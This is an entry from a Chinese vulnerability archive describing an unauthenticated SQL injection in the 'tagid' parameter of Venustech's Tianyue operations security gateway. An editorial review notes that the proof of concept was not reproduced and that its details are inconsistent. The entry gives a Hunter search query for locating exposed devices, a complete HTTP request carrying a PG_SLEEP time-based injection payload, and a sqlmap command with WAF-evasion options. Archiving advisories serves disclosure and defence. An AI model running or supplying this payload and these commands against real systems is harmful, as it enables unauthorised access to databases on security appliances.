---
source: "wy876 漏洞文库"
id: "vw-e7b598ae211bfbeebb4f2631"
entity_id: "ve-e7b598ae211bfbeebb4f2631"
schema_version: "1"
title: "启明星辰天玥运维安全网关tagid参数存在SQL注入漏洞"
product: "启明星辰天玥运维安全网关"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求无cookie，未明确认证；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0%E5%A4%A9%E7%8E%A5%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3tagid%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lli5osp0pzdm1zdo"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"启明星辰天玥运维安全网关\""
---

# 启明星辰天玥运维安全网关tagid参数存在SQL注入漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：启明星辰天玥运维安全网关
- 本文讨论：Reportguide checkrn tagid SQL注入
- 版本、权限与配置前提：请求无cookie，未明确认证；版本未知
- 资料类型：SQL延迟PoC摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Content-Length39与长PG_SLEEP正文不符；无延迟基线或sqlmap结果
- fofa误录Hunter残缺字段，缺修复；SQL数据库仅载荷推定PostgreSQL
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入

### 待核与来源

- 延迟与数据库类型、补丁待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
天玥网络安全审计系统是针对业务环境下用户对网络内的核心IT资产和服务器进行的操作行为进行细粒度审计的合规性管理系统。 启明星辰天玥网络安全审计系统tagid参数存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

# 二、影响版本
+ 天玥运维安全网关

# 三、资产测绘
+ hunter`app.name="启明星辰天玥运维安全网关"`
+ 特征


# 四、漏洞复现
```http
POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
Host: xx.xx.xx.xx
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 39


checkname=123&tagid=123 AND 5327=(SELECT 5327 FROM PG_SLEEP(5))-- OkPa
```


sqlmap 

```plain
sqlmap -u "https://xx.xx.xx.xx/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123" --skip-waf --random-agent --batch -p tagid  --tamper=space2comment
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lli5osp0pzdm1zdo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
